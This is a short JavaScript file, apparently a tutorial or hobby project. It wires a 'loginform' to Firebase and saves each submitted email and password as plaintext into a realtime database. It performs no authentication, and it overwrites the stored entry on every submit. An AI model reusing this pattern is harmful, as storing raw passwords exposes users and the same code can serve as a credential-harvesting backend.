const firebaseConfig = {
  apiKey: "AIzaSyCAA6YDAWSYBM2YB417wm7pxobVRzHBnsk",
  authDomain: "loginform-24162.firebaseapp.com",
  databaseURL: "https://loginform-24162-default-rtdb.firebaseio.com/",
  projectId: "loginform-24162",
  storageBucket: "loginform-24162.appspot.com",
  messagingSenderId: "423854795002",
  appId: "1:423854795002:web:d9796ec1c1ca72a3410143"
};
  firebase.initializeApp(firebaseConfig);

  var loginformDB= firebase.database().ref("loginform");

  document.getElementById("loginform").addEventListener("submit", submitForm);

  function submitForm(e) {
    e.preventDefault();

    var email = getElementVal("email");
    var pass = getElementVal("pass");
    saveMessages(email, pass);

  //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("loginform").reset();
}

const saveMessages = (email,pass) => {
  var newloginform = loginformDB.push();

  loginformDB.set({
    email: email,
    pass:pass,
  });
    
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };